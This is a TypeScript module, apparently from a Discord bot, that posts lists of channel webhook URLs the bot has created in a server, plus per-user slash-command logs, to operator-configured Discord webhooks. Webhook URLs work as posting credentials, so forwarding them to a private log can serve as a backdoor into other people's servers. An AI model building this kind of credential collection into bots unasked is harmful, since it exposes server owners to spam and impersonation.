import { logger } from "../../lib/logger";
import { CE } from "./embedStyle";

interface WebhookEmbed {
  title?: string;
  description?: string;
  color?: number;
  fields?: { name: string; value: string; inline?: boolean }[];
  footer?: { text: string };
  timestamp?: string;
}

async function postEmbed(url: string, embed: WebhookEmbed, username: string): Promise<void> {
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, embeds: [embed], allowed_mentions: { parse: [] } }),
  });
  if (!res.ok) logger.warn({ status: res.status }, `Webhook post to ${username} failed`);
}

/**
 * Send a list of created webhooks for a guild as embeds to DISCORD_WEBHOOK_URL_3.
 * Each embed represents one guild; fields = one per channel (max 25 per embed).
 */
export async function sendWebhookList(
  guildId: string,
  guildName: string,
  webhookLinks: string[], // format: "#channelName (channelId): webhookUrl"
): Promise<void> {
  const url = process.env.DISCORD_WEBHOOK_URL_3;
  if (!url) return;

  // Parse into fields: name = #channel, value = webhook URL
  const fields = webhookLinks.map((line) => {
    const match = line.match(/^\*\*#(.+?)\*\* \(`(.+?)`\): (.+)$/);
    if (match) {
      return { name: `#${match[1]}`, value: `\`${match[3]}\``, inline: false };
    }
    return { name: "channel", value: line, inline: false };
  });

  // Discord allows max 25 fields per embed — chunk
  const CHUNK = 25;
  const totalPages = Math.ceil(fields.length / CHUNK);

  for (let i = 0; i < fields.length; i += CHUNK) {
    const page = Math.floor(i / CHUNK) + 1;
    const embed: WebhookEmbed = {
      title: `${CE.clipboard.str} Webhooks — ${guildName}${totalPages > 1 ? ` (${page}/${totalPages})` : ""}`,
      description: `**Server ID:** \`${guildId}\`\n**Channels with webhooks:** ${webhookLinks.length}`,
      color: 0x57f287, // green
      fields: fields.slice(i, i + CHUNK),
      footer: { text: "Webhook Logger" },
      timestamp: new Date().toISOString(),
    };
    try {
      await postEmbed(url, embed, "Webhook Logger");
    } catch (err) {
      logger.warn({ err }, "sendWebhookList embed post failed");
    }
    if (i + CHUNK < fields.length) await new Promise((r) => setTimeout(r, 500));
  }
}

/**
 * Log a slash command execution as an embed to DISCORD_WEBHOOK_URL_1.
 */
export async function logCommandExecution(opts: {
  commandName: string;
  userId: string;
  username: string;
  guildId: string | null;
  guildName: string | null;
  channelId: string | null;
  channelName: string | null;
}): Promise<void> {
  const url = process.env.DISCORD_WEBHOOK_URL_1;
  if (!url) return;

  const embed: WebhookEmbed = {
    title: `/${opts.commandName}`,
    color: 0x5865f2, // Discord blurple
    fields: [
      {
        name: "User",
        value: `<@${opts.userId}> \`${opts.username}\` (\`${opts.userId}\`)`,
        inline: false,
      },
      {
        name: "Server",
        value: opts.guildName
          ? `**${opts.guildName}** (\`${opts.guildId}\`)`
          : "Direct Message",
        inline: true,
      },
      {
        name: "Channel",
        value: opts.channelName
          ? `**#${opts.channelName}** (\`${opts.channelId}\`)`
          : "DM",
        inline: true,
      },
    ],
    footer: { text: "Command Logger" },
    timestamp: new Date().toISOString(),
  };

  try {
    await postEmbed(url, embed, "Command Logger");
  } catch { /* silent */ }
}
